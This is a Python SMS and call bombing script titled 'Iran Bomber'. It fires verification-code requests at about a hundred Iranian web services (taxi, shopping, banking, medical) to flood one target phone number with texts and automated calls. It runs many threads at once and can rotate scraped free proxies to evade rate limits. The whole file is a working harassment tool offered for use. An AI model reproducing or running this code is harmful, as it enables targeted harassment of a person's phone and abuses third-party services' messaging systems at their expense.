# import requests as req
from requests import post, get
from pystyle import *
from sys import argv, exit
from random import choice
from os import path
from threading import Thread
from user_agent import generate_user_agent as agent
from time import sleep



class Sms:
    def __init__(self, phone, proxy):
        self.phone, self.proxy = phone, proxy


    def snapp(self):
        p = self.proxy or None
        try:
            r = post(url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
                json={"cellphone": self.phone}, headers={"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"},
                proxies=p)
        except: pass
        
    def tapsi(self):
        p = self.proxy or None
        try:
            post(url="https://tap33.me/api/v2/user", 
                json={"credential":{"phoneNumber":f'0{self.phone.split("+98")[1]}',"role":"PASSENGER"}},
                proxies=p)
        except: pass
        
    def torob(self):
        p = self.proxy or None
        try:
            get(url=f'https://api.torob.com/a/phone/send-pin/?phone_number=0{self.phone.split("+98")[1]}',
                    headers={"Host": "api.torob.com","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","accept": "*/*","origin": "https://torob.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://torob.com/user/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6","cookie": "amplitude_id_95d1eb61107c6d4a0a5c555e4ee4bfbbtorob.com\u003deyJkZXZpY2VJZCI6ImFiOGNiOTUyLTk1MTgtNDhhNS1iNmRjLTkwZjgxZTFjYmM3ZVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU5Njg2OTI4ODM1MSwibGFzdEV2ZW50VGltZSI6MTU5Njg2OTI4ODM3NCwiZXZlbnRJZCI6MSwiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjN9"},
                    proxies=p)
        except: pass

    def alibaba(self):
        p = self.proxy or None
        try:
            post(url="https://ws.alibaba.ir/api/v3/account/mobile/otp",
                json={"phoneNumber":f'0{self.phone.split("+98")[1]}'},
                proxies=p)
        except: pass

    def snapmarket(self):
        try:
            post(url="https://account.api.balad.ir/api/web/auth/login/",
                json={
                    "phone_number": f'0{self.phone.split("+98")[1]}',
                    "os_type": "W"
                },
                proxies=self.proxy)
        except: pass


    def miare(self):
        try:
            get(url=f'https://www.miare.ir/p/restaurant/#/login?phone=0{self.phone.split("+98")[1]}',
                proxies=self.proxy)
        except: pass

    def ostadkar(self):
        try:    
            post(url="https://api.ostadkr.com/login",
                json={"mobile": f'0{self.phone.split("+98")[1]}'},
                proxies=self.proxy)
        except: pass

    def drnext(self):
        try:    
            post(url="https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", 
                json={
                    "source": "besina",
                    "mobile": f'0{self.phone.split("+98")[1]}'
                }, 
                proxies=self.proxy)
        except: pass

    def behtarino(self):
        try:
            post(url="https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", 
                json={"phone": f'0{self.phone.split("+98")[1]}'},
                proxies=self.proxy)
        except: pass

    def bit24(self): 
        try:
            post(url='https://bit24.cash/auth/bit24/api/v3/auth/check-mobile',
                json={"mobile": f'0{self.phone.split("+98")[1]}',
                    "contry_code": "98"},
                    proxies=self.proxy)
        except: pass

    def drdr(self):
        try:
            post(url="https://drdr.ir/api/v3/auth/login/mobile/init",
                    json={"mobile": self.phone.split("+98")[1]},
                    proxies=self.proxy)
        except: pass


    def drto(self):
        try:
            get("https://api.doctoreto.com/api/web/patient/v1/accounts/register",
                    json={
                        "mobile": self.phone.split("+98")[1],
                        "captcha": "",
                        "country_id": 205
                    },
                    proxies=self.proxy)
        except: pass

    def okala(self):
        try:
            post(url="https://api-react.okala.com/C/CustomerAccount/OTPRegister",
                    json={"mobile": f'0{self.phone.split("+98")[1]}',
                            "deviceTypeCode": 0, "confirmTerms": True, "notRobot": False},
                    proxies=self.proxy)
        except: pass

    def banimod(self):
        try:
            post(url="https://mobapi.banimode.com/api/v2/auth/request",
                    json={"phone": f'0{self.phone.split("+98")[1]}' },
                    proxies=self.proxy)
        except: pass


    def berozmarket(self):
        try:
            post(url="https://api.beroozmart.com/api/pub/account/send-otp",
                    json={"mobile": f'0{self.phone.split("+98")[1]}', "sendViaSms": True, "email": "null", "sendViaEmail": False},
                    proxies=self.proxy)
        except: pass

    def itoll(self):
        try:
            post(url="https://app.itoll.com/api/v1/auth/login",
                    json={"mobile": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)
        except: pass

    def gap(self):
        try:
            get(url=f'https://core.gap.im/v1/user/add.json?mobile=%2B98{self.phone.split("+98")[1]}', proxies=self.proxy)
        except: pass

    def call(self):
        try: 
            get(url=f'https://auth.mrbilit.com/api/Token/send/byCall?mobile=0{self.phone.split("+98")[1]}',
                    proxies=self.proxy)
            persian = get(f"https://api.codebazan.ir/adad/?text={self.phone.split('+98')[1]}").json()
            get('https://www.tezolmarket.com/Account/Login',
                    f'PhoneNumber=۰{persian["result"]["fa"]}&SendCodeProcedure=1')
            get(url=f'https://core.gap.im/v1/user/resendCode.json?mobile=%2B98{self.phone.split("+98")[1]}&type=IVR')
        except: pass


    def pinket(self):
        try: 
            post(url="https://pinket.com/api/cu/v2/phone-verification",
                    json={"phoneNumber": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)
        except: pass

    def footbal(self):
        try:
            post(url="https://football360.ir/api/auth/verify-phone/",
                    json={"phone_number": self.phone},
                    proxies=self.proxy)
        except: pass

    def pinorest(self):
        try:
            post(url="https://api.pinorest.com/frontend/auth/login/mobile",
                    json={"mobile": f'{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)
        except: pass

    def mrbilit(self):
        try:
            get(url=f'https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=0{self.phone.split("+98")[1]}&source=2&sendTokenIfNot=true', proxies=self.proxy)
        except: pass


    def hm(self):
        try:
            post(url="https://www.hamrah-mechanic.com/api/v1/membership/otp",
                    json={"PhoneNumber":f'0{self.phone.split("+98")[1]}',"prevDomainUrl":"https://www.google.com/","landingPageUrl":"https://www.hamrah-mechanic.com/cars-for-sale/","orderPageUrl":"https://www.hamrah-mechanic.com/membersignin/","prevUrl":"https://www.hamrah-mechanic.com/cars-for-sale/","referrer":"https://www.google.com/"},
                    proxies=self.proxy)
        except: pass


    def lendo(self):
        try: 
            post(url="https://api.lendo.ir/api/customer/auth/send-otp",
                    json={ "mobile": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)
        except: pass

    def taghche(self):
        try: 
            post(url="https://gw.taaghche.com/v4/site/auth/login",
                    json={"contact": f'0{self.phone.split("+98")[1]}', "forceOtp": False},
                    proxies=self.proxy)
        except: pass

    def fidibo(self):
        try: 
            post("https://fidibo.com/user/login-by-sms", 
                    f'mobile_number={self.phone.split("+")[1]}&country_code=ir&K1YwQTI0V2xtb3lZNGw0TDhDZm1SUT09=c0tjS0ViOTE2b5F1eE9MRjdLWEhodz09',
                    proxies=self.proxy)
        except: pass

    def khodro45(self):
        try: 
            post(url="https://khodro45.com/api/v1/customers/otp/", 
                    json={"mobile": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)
        except: pass

    def pateh(self):
        for i in range(20):
            try: 
                post(url="https://api.pateh.com/api/v1/LoginOrRegister",
                        json={"mobile": f'0{self.phone.split("+98")[1]}'},
                        proxies=self.proxy,
                        headers={
    "authority": "api.pateh.com",
    "method": "POST",
    "path": "/api/v1/LoginOrRegister",
    "scheme": "https",
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
    "Content-Length": "24",
    "Content-Type": "application/json;charset=UTF-8",
    "Origin": "https://www.pateh.com",
    "Referer": "https://www.pateh.com/",
    "Sec-Ch-Ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "Windows",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent": agent(os="win")
            })
            except: pass

    def ketabchi(self):
        try: 
            post(url="https://ketabchi.com/api/v1/auth/requestVerificationCode",
                    json={"auth": {"phoneNumber": f'0{self.phone.split("+98")[1]}'}},
                    proxies=self.proxy)
        except: pass

    def ec(self):
        try: 
            post(url="https://pay.rayanertebat.ir/api/User/Otp?t=1692088339811",
                    json={"mobileNo": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)
        except: pass


    def bime(self):
        try: 
            post(url="https://bimito.com/api/vehicleorder/v2/app/auth/login-with-verify-code",
                    json={"phoneNumber": f'0{self.phone.split("+98")[1]}', "isResend": False},
                    proxies=self.proxy)
        except: pass

    def pindo(self):
        try: 
            post(url="https://api.pindo.ir/v1/user/login-register/",
                    json={"phone": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)
        except: pass

    def delino(self):
        try: 
            post(url="https://www.delino.com/user/register",
                    json={ "mobile": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)
        except: pass

    def zoodex(self):
        try: 
            post(url="https://admin.zoodex.ir/api/v1/login/check",
                    json={"mobile": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)
        except: pass


    def kukala(self):
        try: 
            post(url="https://api.kukala.ir/api/user/Otp", 
                    json={"phoneNumber": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)
        except: pass


    def baskol(self):
        try: 
            post(url="https://www.buskool.com/send_verification_code",
                    json={"phone": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)
        except: pass

    def setex(self):
        try: 
            post(url="https://3tex.io/api/1/users/validation/mobile",
                    json={"receptorPhone": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)
        except: pass


    def deniizshop(self):
        try: 
            post(url="https://deniizshop.com/api/v1/sessions/login_request",
                    json={"mobile_number": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)
        except: pass

    def flightioo(self):
        try: 
            post(url="https://flightio.com/bff/Authentication/CheckUserKey",
                    json={"userKey": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)
        except: pass



    def abantether(self):
        try:
            post(url="https://abantether.com/users/register/phone/send/",
                    json={"phoneNumber": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def pooleno(self):
        try:
            post(url="https://api.pooleno.ir/v1/auth/check-mobile",
                    json={"mobile": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass


    def wide(self):
        try: 
            post(url="https://agent.wide-app.ir/auth/token",
                    json={"grant_type": "otp", "client_id": "62b30c4af53e3b0cf100a4a0", "phone": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)
        except: pass

    def ilms(self):
        try:
            post(url="https://messengerg2c4.iranlms.ir/",
                    json={"se": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def classino(self):
        try:
            post(url="https://nx.classino.com/otp/v1/api/login",
                    json={"mobile": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass


    def snappfood(self):
        try:
            post(url="https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa",
                    json={"cellphone": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def bitbarg(self):
        try:
            post(url="https://api.bitbarg.com/api/v1/authentication/registerOrLogin",
                    json={"phone": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass




    def bahramshop(self):
        try:
            post(url="https://api.bahramshop.ir/api/user/validate/username",
                    json={"username": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def tak(self):
        try:
            post(url="https://takshopaccessorise.ir/api/v1/sessions/login_request",
                    json={"mobile_phone": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass



    def chamedon(self):
        try:
            post(url="https://chamedoon.com/api/v1/membership/guest/request_mobile_verification",
                    json={"mobile": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def kilid(self):
        try:
            post(url="https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL",
                    json={"mobile": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass


    def otaghak(self):
        try:
            post(url="https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
                    json={"userName": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass



    def shab(self):
        try:
            post(url="https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile",
                    json={"mobile": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def raybit(self):
        try:
            post(url="https://api.raybit.net:3111/api/v1/authentication/register/mobile",
                    json={"mobile": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass



    def farvi(self):
        try:
            post(url="https://farvi.shop/api/v1/sessions/login_request",
                    json={"mobile_phone": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass


    def namava(self):
        try:
            post(url="https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
                    json={"UserName": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass


    def a4baz(self):
        try:
            post(url="https://a4baz.com/api/web/login",
                    json={"cellphone": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def anar(self):
        try:
            post(url="https://api.anargift.com/api/people/auth",
                    json={"user": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def nobat(self):
        try:
            post(url="https://nobat.ir/api/public/patient/login/phone",
                    json={"mobile": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def ayantech(self):
        try: 
            post(url="https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode",
                    json={"Parametrs": {"ApplicationType": "Web","ApplicationUniqueToken": None, "ApplicationVersion": "1.0.0","MobileNumber": f'0{self.phone.split("+98")[1]}' }},
                    proxies=self.proxy)
        except: pass

    def simkhan(self):
        try:
            post(url="https://www.simkhanapi.ir/api/users/registerV2",
                    json={"mobileNumber": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def sibirani(self):
        try:
            post(url="https://sandbox.sibirani.ir/api/v1/user/invite",
                    json={"username": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def hiprejan(self):
        try:
            post(url="https://shop.hyperjan.ir/api/users/manage",
                    json={"mobile": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass


    def digikala(self):
        try:
            post(url="https://api.digikala.com/v1/user/authenticate/",
                    json={"username": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass


    def hiword(self):
        try:
            post(url="https://hiword.ir/wp-json/otp-login/v1/login",
                    json={"identifier": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def tikban(self):
        try:
            post(url="https://tikban.com/Account/LoginAndRegister",
                    json={"cellPhone": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def dicardo(self):
        try:
            post(url="https://dicardo.com/main/sendsms",
                    json={"phone": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def digistyle(self):
        try:
            post(url="https://www.digistyle.com/users/login-register/",
                    json={"loginRegister[email_phone]": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def banan(self):
        try:
            post(url="https://banankala.com/home/login",
                    json={"Mobile": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def offdecor(self):
        try:
            post(url="https://www.offdecor.com/index.php?route=account/login/sendCode",
                    json={"phone": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def exo(self):
        try:
            post(url="https://exo.ir/index.php?route=account/mobile_login",
                    json={"mobile_number": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass


    def shahre_farsh(self):
        try:
            post(url="https://shahrfarsh.com/Account/Login",
                    json={"phoneNumber": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def takfarsh(self):
        try:
            post(url="https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php",
                    json={"phone_email": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def beheshti_carpet(self):
        try:
            post(url="https://shop.beheshticarpet.com/my-account/",
                    json={"billing_mobile": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass


    def khanomi(self):
        try:
            post(url="https://www.khanoumi.com/accounts/sendotp",
                    json={"mobile": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def rojashop(self):
        try:
            post(url="https://rojashop.com/api/auth/sendOtp",
                    json={"mobile": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def dadpardaz(self):
        try:
            post(url="https://dadpardaz.com/advice/getLoginConfirmationCode",
                    json={"mobile": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def rokla(self):
        try:
            post(url="https://api.rokla.ir/api/request/otp",
                    json={"mobile": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def kh45(self):
        try:
            post(url="https://khodro45.com/api/v1/customers/otp/",
                    json={"mobile": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def mb(self):
        try:
            post(url="https://api.pezeshket.com/core/v1/auth/requestCode",
                    json={"mobileNumber": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def virgool(self):
        try:
            post(url="https://virgool.io/api/v1.4/auth/verify",
                    json={"method": "phone", "identifier": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass


    def timche(self):
        try:
            post(url="https://api.timcheh.com/auth/otp/send",
                    json={"mobile": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass

    def paklean(self):
        try:
            post(url="https://client.api.paklean.com/user/resendCode",
                    json={"username": f'0{self.phone.split("+98")[1]}'},
                    proxies=self.proxy)

        except: pass
    def daal(self):
        try:
            post(url="https://daal.co/api/authentication/login-register/method/phone-otp/user-role/customer/verify-request"
        ,headers={ "Accept": "application/json",
                },
                json={ "phone": f"0{self.phone.split('+98')[1]}"},
                proxies= self.proxy)
        except: 
            pass

    def bime2(self):
        try:
            post(url="https://bimebazar.com/accounts/api/login_sec/",
                json={ "username": f"0{self.phone.split('+98')[1]}"},
                proxies=self.proxy)
        except: pass

    def azki(self):
        try:
            post(url="https://www.azki.co/api/vehicleorder/v2/app/auth/check-login-availability/",
                json={"phoneNumber": f"0{self.phone.split('+98')[1]}"},
                proxies=self.proxy)
        except: pass

    def bimito(self):
        try:
            post(url="https://bimito.com/api/vehicleorder/v2/app/auth/check-login-availability/",
                json={"phoneNumber": f"0{self.phone.split('+98')[1]}"},
                    proxies=self.proxy)
        except: pass

    def safarMarket(self):
        try: 
            post(url="https://safarmarket.com//api/security/v2/user/otp",
                json={"phone": f"0{self.phone.split('+98')[1]}"},
                proxies=self.proxy)
        except: pass


class Calls:
    def __init__(self, phone, proxy) -> None:
        self.phone, self.proxy = phone, proxy
    
    def call1(self):
        try: 
            get(url=f'https://auth.mrbilit.com/api/Token/send/byCall?mobile=0{self.phone}',
                    proxies=self.proxy)
            persian = get(f"https://api.codebazan.ir/adad/?text={self.phone}").json()
            get('https://www.tezolmarket.com/Account/Login',
                    f'PhoneNumber=۰{persian["result"]["fa"]}&SendCodeProcedure=1')
            get(url=f'https://core.gap.im/v1/user/resendCode.json?mobile=%2B98{self.phone}&type=IVR')
        except: pass
    def call2(self):
        post(url="https://novinbook.com/index.php?route=account/phone",data=f"phone=0{self.phone}&call=yes",headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '26','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'language=fa; currency=RLS','origin': 'https://novinbook.com','referer': 'https://novinbook.com/index.php?route=account/phone','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': agent(os="win"),'x-requested-with': 'XMLHttpRequest'})

    def call3(self):   
        get(url=f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=0{self.phone}", headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','device': 'web','deviceid': '6','referer': 'https://www.azki.com/','sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': agent(os="win"),'user-name': 'null','user-token': '2ub07qJQnuG7w1NtXMifm1JeKnKSJzBKnIosaF0FnM8mVfwWAAV4Ae9cMu3JxskL'})


def main(phonenum: str, proxy):
    pr = { "http": proxy, "https": proxy} if proxy else None
    x = Sms(phone=phonenum, proxy=pr)
    attrs = [method for method in dir(x) if callable(getattr(x, method)) if not method.startswith('_')]
    for a in attrs:
        try: Thread(target=getattr(x, a)).start()
        except: pass


def main_call(phonenum: str, proxy):
    pr = { "http": proxy, "https": proxy} if proxy else None
    x = Calls(phone=phonenum, proxy=pr)
    attrs = [method for method in dir(x) if callable(getattr(x, method)) if not method.startswith('_')]
    for a in attrs:
        try: Thread(target=getattr(x, a)).start()
        except: pass
        sleep(5)

if __name__ == "__main__":
    banner = '''



            ██╗██████╗  █████╗ ███╗  ██╗
            ██║██╔══██╗██╔══██╗████╗ ██║
            ██║██████╔╝███████║██╔██╗██║
            ██║██╔══██╗██╔══██║██║╚████║
            ██║██║  ██║██║  ██║██║ ╚███║
            ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚══╝

    ██████╗  █████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
    ██╔══██╗██╔══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
    ██████╦╝██║  ██║██╔████╔██║██████╦╝█████╗  ██████╔╝
    ██╔══██╗██║  ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
    ██████╦╝╚█████╔╝██║ ╚═╝ ██║██████╦╝███████╗██║  ██║
    ╚═════╝  ╚════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
    '''

    logo = Colorate.Horizontal(Colors.DynamicMIX((Col.cyan, Col.blue, Col.purple)), Center.XCenter(banner))

    # print(logo)
    def err():
        print()
        System.Clear()
        print('''
            {2}Usage = {1}python bomber.py +989123456789{2}
            self.proxy = {1}--self.proxy{2}
            threads = {1}--threads {4}<amount>{2}
            {4}>>{3} python bomber.py {1}--proxies --threads 7
                {4}>>>{5} This will start bombing with proxies and 7 Threads 
            {0}
            Tip: 
                You can use {4}<{0} python bomber.py --scrapp {4}>{0} to
                get Fresh proxies! 
                
            {5}Press Enter 2 times for exit
    '''.format(Col.cyan, Col.green, Col.light_gray, Col.light_blue, Col.pink, Col.light_red))
        print(Col.reset) 
        input() ; input()
        exit()

    def info_table(threads, number, proxies):
        if path.exists("proxies.txt"):
            with open("proxies.txt", 'r') as file:
                count = len(file.readlines())
        else:
            count = 0
        
        def bruh():
            return f"{Col.orange}| {Col.cyan}{count} " if proxies == True else "    "
        text = '''
        
                            {5}Started the Job with {0}{6}{5} thread(s)                   
                                                    
                            {2}Phone Number {3}={0} {7}                          
                                                    
                            {4}Proxies:                                           
                                {3}>>> {2}State{4}: {0}{8} {9}                        


                    {11}       
    '''.format(Col.green, Col.cyan, Col.purple, Col.dark_blue, Col.orange, Col.red, threads, number, proxies, bruh(), Col.yellow, Colors.reset)
        return text

    def random_proxy():
        with open('proxies.txt', 'r') as file:
            p = file.readlines()

            return choice(p).strip() if len(p) > 0 else None
    if not len(argv) > 1:
        err()
        # print(Col.reset)
    else:
        num = argv[1]
        args = ' '.join(argv).lower().split('--') if '--' in ' '.join(argv) else False

        if num.startswith("+98") and len(num) == 13:
            System.Clear()
            print(logo)
            def return_num(txt):
                lst = [str(i) for i in range(10)]
                nums = []
                for i in txt:
                    if i in lst:
                        nums.append(i)
                else:
                    return ''.join(nums)
            if args:
                if 'call' in ' '.join(args):
                    main_call(phonenum=num, proxy=None)
                threads = return_num(''.join(args).split('threads')[1]) if not 'threads' in args else 1
                if 'proxies' in ' '.join(args):
                    System.Title(f"Threads: {threads} , Proxies: True, Number: {num}")
                    for i in range(int(threads)):
                        Thread(target=main, args= (num, random_proxy()), name=str(i)).start()
                    else: print(Center.XCenter(info_table(threads=threads, proxies=True, number=num)))
                        
                    # else: 
                    #     end()
                elif not 'proxies' in ''.join(args):
                    System.Title(f"Threads: {threads} , Proxies: False, Number: {num}")
                    for i in range(int(threads)):
                        Thread(target=main, args=(num, None), name=str(i)).start()
                    else: 
                        print(info_table(threads=threads, proxies=False, number=num))
            else:
                System.Title(f"Threads: 1 , Proxies: False, Number: {num}") 
                main(num, None)
                print(info_table(threads=1, proxies=False, number=num))
        else:
            if args:
                if "scrapp" in args:
                    with open("proxies.txt", "w") as file:
                        System.Clear()
                        print(logo)
                        print('\n')
                        p = get("https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt").text
                        file.write(p)
                        Write.Print(text="   Your 'proxies.txt' has been updated, Enjoy!", color=Colors.red_to_yellow, interval=0.000)

                else: 
                    err()
            else:
                err()
